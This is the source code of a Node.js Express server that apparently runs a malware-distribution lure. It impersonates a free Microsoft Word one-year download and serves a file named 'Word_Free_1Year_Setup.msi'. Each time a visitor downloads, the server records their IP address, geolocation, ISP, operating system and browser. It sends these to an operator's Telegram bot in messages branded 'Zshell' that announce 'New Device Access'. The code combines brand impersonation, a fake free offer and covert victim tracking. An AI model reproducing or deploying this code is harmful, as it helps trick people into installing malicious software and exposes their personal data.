const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const UAParser = require('ua-parser-js');
require('dotenv').config();

// Environment validation and configuration
const config = {
    PORT: process.env.PORT || 5000,
    NODE_ENV: process.env.NODE_ENV || 'development',
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || null,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || null,
    HOST: process.env.NODE_ENV === 'production' ? '0.0.0.0' : '0.0.0.0' // Always bind to 0.0.0.0 for cloud platforms
};

// Validate required dependencies
if (!config.PORT || isNaN(config.PORT)) {
    console.error('❌ Invalid PORT configuration. Using default: 5000');
    config.PORT = 5000;
}

// Log configuration status
console.log('🔧 Configuration loaded:');
console.log(`   📍 Environment: ${config.NODE_ENV}`);
console.log(`   🌐 Port: ${config.PORT}`);
console.log(`   🔗 Host: ${config.HOST}`);
console.log(`   📱 Telegram: ${config.TELEGRAM_BOT_TOKEN ? '✅ Enabled' : '⚠️ Disabled'}`);

const app = express();

// Production-ready error handling
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('📤 SIGTERM received. Shutting down gracefully...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('📤 SIGINT received. Shutting down gracefully...');
    process.exit(0);
});

// Enhanced Telegram Logging Function (Non-blocking)
function sendTelegramLog(message) {
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
        console.log('⚠️ Telegram logging disabled - missing bot token or chat ID');
        return;
    }

    // Fire-and-forget with timeout to prevent blocking downloads
    const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Timeout')), 5000)
    );

    const sendPromise = axios.post(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: config.TELEGRAM_CHAT_ID,
        text: message
        // Removed parse_mode to prevent injection issues
    });

    Promise.race([sendPromise, timeoutPromise])
        .then(() => console.log('✅ Telegram log sent successfully'))
        .catch(error => console.error('❌ Failed to send Telegram log:', error.message));
}

// Get client IP address with proper forwarded header parsing
function getClientIP(req) {
    // Parse x-forwarded-for to get the first (original) IP
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const firstIP = forwarded.split(',')[0].trim();
        if (firstIP && firstIP !== 'unknown') {
            return firstIP;
        }
    }
    
    return req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
           req.ip ||
           'Unknown';
}

// Get geolocation data for IP
async function getLocationData(ip) {
    try {
        // Skip geolocation for localhost/private IPs
        if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
            return { country: 'Local Network', city: 'Localhost', isp: 'Local' };
        }
        
        // Use IP-API.com (free, no API key required, 45 requests/minute)
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,isp,org,timezone`, {
            timeout: 3000
        });
        
        if (response.data && response.data.status === 'success') {
            return {
                country: response.data.country || 'Unknown',
                city: response.data.city || 'Unknown',
                region: response.data.regionName || '',
                isp: response.data.isp || 'Unknown',
                timezone: response.data.timezone || 'Unknown'
            };
        }
    } catch (error) {
        console.log('⚠️ Geolocation lookup failed:', error.message);
    }
    
    return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
}

// Format download log message with real detection
async function formatDownloadLog(userAgent, ip, referrer) {
    const parser = new UAParser(userAgent);
    const browser = parser.getBrowser();
    const os = parser.getOS();
    const device = parser.getDevice();
    
    // Get real geolocation data
    const location = await getLocationData(ip);
    
    const currentTime = new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    // Format platform with real detection
    const platformName = os.name || 'Unknown OS';
    const platformVersion = os.version ? ` ${os.version}` : '';
    const platform = `${platformName}${platformVersion}`;
    
    // Format browser with real detection
    const browserName = browser.name || 'Unknown Browser';
    const browserVersion = browser.version ? ` ${browser.version}` : '';
    const browserInfo = `${browserName}${browserVersion}`;
    
    // Format device type
    const deviceType = device.type || os.name || platformName;
    
    // Format location info
    const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country;
    const ispInfo = location.isp !== 'Unknown' ? ` (${location.isp})` : '';

    return `🧛‍♂️ Zshell
📢 New Device Access
 DOCX CLIENT

🌍 IP: ${ip}${ispInfo}
🖥 Platform: ${platform}
🌐 Browser: ${browserInfo}
🌎 Country: ${locationInfo}

🔵 Docx User attempting to download Docx file
📱 Device: ${deviceType}
🌍 IP: ${ip}
🌐 Browser: ${browserInfo}
📍 Location: ${locationInfo}
⏰ Time: ${currentTime}
🔄 Referrer: ${referrer || 'Direct'}

🔽 Docx user attempting to download Docx file for ${deviceType} device

✅ Docx file download started successfully for ${deviceType} device`;
}

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files - use Vite build in production, client folder in development  
const isProduction = process.env.NODE_ENV === 'production';
const staticPath = isProduction && require('fs').existsSync('dist/client') ? 'dist/client' : 'client';

app.use(express.static(staticPath, {
    setHeaders: (res, filePath) => {
        if (isProduction && filePath.includes('.') && !filePath.endsWith('.html')) {
            // Cache hashed assets in production for 1 year
            res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        } else {
            // No cache for HTML and development mode
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
        }
    }
}));

// API Routes
app.get('/api/download/word-free', (req, res) => {
    // Resolve MSI path correctly for both development and production
    const msiFileName = 'Word_Free_1Year_Setup.msi';
    let msiPath;
    
    if (isProduction && require('fs').existsSync('dist/client')) {
        // In production, Vite copies files from client/public to dist/client
        msiPath = path.join('dist/client', msiFileName);
    } else {
        // In development, use original path
        msiPath = path.join('client/public', msiFileName);
    }
    
    const filePath = path.join(__dirname, msiPath);
    const fileName = 'Word_Free_1Year_Setup.msi';
    
    // Capture user details for logging
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const clientIP = getClientIP(req);
    const referrer = req.headers.referer || req.headers.referrer || 'Direct';
    
    console.log(`📥 Download request received for: ${fileName}`);
    console.log(`📂 File path: ${filePath}`);
    console.log(`👤 Client IP: ${clientIP}`);
    console.log(`🌐 User Agent: ${userAgent}`);
    
    // Send Telegram log for download attempt (non-blocking)
    formatDownloadLog(userAgent, clientIP, referrer)
        .then(logMessage => sendTelegramLog(logMessage))
        .catch(error => console.error('❌ Failed to format log message:', error.message));
    
    // Set headers for download
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Cache-Control', 'no-cache');
    
    // Send the file for download
    res.download(filePath, fileName, (err) => {
        if (err) {
            console.error('❌ Download error:', err);
            
            // Send Telegram log for download error (non-blocking)
            const errorMessage = `❌ Download Error
🧛‍♂️ Zshell - Error Report
🌍 IP: ${clientIP}
📱 Device: ${new UAParser(userAgent).getOS().name || 'Unknown'}
❌ Error: ${err.message}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
            
            sendTelegramLog(errorMessage);
            
            res.status(500).json({
                success: false,
                message: "Download failed. Please try again.",
                error: err.message
            });
        } else {
            console.log(`✅ Download completed successfully: ${fileName}`);
            
            // Send success confirmation to Telegram (non-blocking)
            getLocationData(clientIP)
                .then(location => {
                    const parser = new UAParser(userAgent);
                    const os = parser.getOS();
                    const browser = parser.getBrowser();
                    const deviceType = os.name || 'Unknown';
                    const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country;
                    
                    const successMessage = `✅ Download Completed Successfully
🧛‍♂️ Zshell - Success Report
🌍 IP: ${clientIP}
📍 Location: ${locationInfo}
📁 File: ${fileName}
📱 Device: ${deviceType}
🌐 Browser: ${browser.name || 'Unknown'} ${browser.version || ''}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
                    
                    sendTelegramLog(successMessage);
                })
                .catch(error => console.error('❌ Failed to format success message:', error.message));
        }
    });
});

app.get('/api/product/info', (req, res) => {
    res.json({
        productId: "cfq7ttc0pbmb",
        title: "Word - Free 1 Year License",
        description: "• Free for 1 PC or Mac for 1 year\n• Create beautiful and engaging documents\n• Share your documents with others and edit together in real time*\n• Compatible with Windows 11, Windows 10, or macOS\n\n*Files must be shared from OneDrive.",
        productType: "Free Trial",
        price: {
            currency: "USD",
            current: "Free",
            original: "$179.99",
            savings: "$179.99",
            dynamicOriginalPrice: "Free for 1 Year"
        },
        action: {
            action: "DownloadFree",
            actionText: "Download Free Version",
            behaviorTag: 82,
            disabled: false
        },
        licenseInfo: {
            type: "Free 1 Year Trial",
            duration: "365 days",
            features: "Full Microsoft Word functionality",
            support: "Community support included"
        }
    });
});


// Export the app for serverless platforms
module.exports = app;

// Only start the server if not running in serverless environment
if (!process.env.VERCEL && !process.env.NETLIFY) {
    // Determine platform
    const isReplit = process.env.REPLIT_DEPLOYMENT;
    const host = '0.0.0.0';

    app.listen(config.PORT, config.HOST, () => {
        console.log(`🚀 Microsoft Word Free Download Server running on http://${config.HOST}:${config.PORT}`);
        console.log(`📄 Frontend: http://${config.HOST}:${config.PORT} (serving from ${staticPath})`);
        console.log(`🔗 API: http://${config.HOST}:${config.PORT}/api`);
        console.log(`✅ Client-Server separation active`);
        console.log(`⚡ Vite available for builds with: npm run build`);
        console.log(`🔧 Environment: ${config.NODE_ENV}`);
        console.log(`📊 Analytics: ${config.TELEGRAM_BOT_TOKEN ? 'Enabled' : 'Disabled'}`);
        
        if (isReplit) {
            console.log(`✅ Replit deployment ready: ${config.HOST}:${config.PORT}`);
        } else {
            console.log(`✅ Production deployment ready: ${config.HOST}:${config.PORT}`);
        }
    });
}